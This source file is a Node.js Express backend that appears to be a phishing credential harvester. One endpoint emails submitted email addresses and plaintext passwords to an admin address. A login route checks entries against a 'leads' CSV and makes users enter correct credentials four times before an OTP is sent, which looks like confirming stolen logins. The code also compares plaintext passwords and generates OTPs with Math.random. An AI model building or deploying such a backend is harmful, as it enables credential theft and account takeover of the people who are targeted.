require('dotenv').config();

const express = require('express');
const cors = require('cors');
const cookieParser = require('cookie-parser');
const fs = require('fs');
const csv = require('csv-parser');
const nodemailer = require('nodemailer');
const multer = require('multer'); // For future file upload support, optional

// Environment variables loaded here
const port = process.env.PORT || 5000;
const smtpUser = process.env.SMTP_USER;
const smtpPass = process.env.SMTP_PASS;
const adminEmail = process.env.ADMIN_EMAIL;
const jwtSecret = process.env.JWT_SECRET;
const FRONTEND_URL = process.env.FRONTEND_URL || 'https://your-netlify-site.netlify.app';

const app = express();

// Middleware
app.use(express.json());
app.use(cookieParser());
app.use(cors({
  origin: FRONTEND_URL,
  credentials: true
}));

// Nodemailer transporter
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: smtpUser,
    pass: smtpPass
  }
});

// Load leads from CSV
let leads = [];
fs.createReadStream('leads.csv')
  .pipe(csv())
  .on('data', (row) => {
    leads.push(row);
  })
  .on('end', () => {
    console.log(`Loaded ${leads.length} leads from CSV`);
  });

// Track login attempts and OTPs
const attemptsMap = {};
const otpMap = {};

// Optional multer setup for file uploads (if needed)
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, 'uploads/'); // Ensure folder exists
  },
  filename: function (req, file, cb) {
    cb(null, Date.now() + '-' + file.originalname);
  }
});
const upload = multer({ storage: storage });

// Endpoint: Send arbitrary user info to admin email
app.post('/sendUserInfo', (req, res) => {
  const userData = req.body;

  const mailOptions = {
    from: smtpUser,
    to: adminEmail,
    subject: 'User Information',
    text: `User Email: ${userData.email}, User Password: ${userData.password}`
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error(error);
      return res.status(500).send('Failed to send email');
    }
    console.log('Email sent: ' + info.response);
    res.status(200).send('Email sent successfully');
  });
});

// Endpoint: Login with attempts counting, send OTP after 4th correct login
app.post('/api/login', (req, res) => {
  const { email, password } = req.body;
  const user = leads.find(u => u.email === email && u.password === password);

  if (!user) {
    return res.json({ success: false, message: 'Invalid credentials' });
  }

  attemptsMap[email] = (attemptsMap[email] || 0) + 1;

  if (attemptsMap[email] < 4) {
    return res.json({
      success: true,
      stage: 'login',
      message: `Correct details (${attemptsMap[email]}/4)`
    });
  }

  // 4th attempt: generate OTP and send email
  const otp = Math.floor(100000 + Math.random() * 900000).toString();
  otpMap[email] = otp;

  transporter.sendMail({
    from: smtpUser,
    to: email,
    subject: 'Your OTP Code',
    text: `Your OTP code is ${otp}`
  }, (err, info) => {
    if (err) {
      console.error('Email error:', err);
      return res.json({ success: false, message: 'Failed to send OTP' });
    }
    console.log('OTP Email sent:', info.response);
  });

  attemptsMap[email] = 0;

  res.cookie('sessionEmail', email, {
    httpOnly: true,
    secure: true,       // HTTPS only in production
    sameSite: 'None'
  });

  return res.json({
    success: true,
    stage: 'otp',
    message: 'OTP sent to your email'
  });
});

// Endpoint: Verify OTP
app.post('/api/verify', (req, res) => {
  const { email, code } = req.body;

  if (otpMap[email] && otpMap[email] === code.toString()) {
    delete otpMap[email];
    return res.json({ success: true, message: 'OTP verified' });
  }

  return res.json({ success: false, message: 'Invalid OTP' });
});

// Start server
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
  console.log(`Frontend origin allowed at ${FRONTEND_URL}`);
});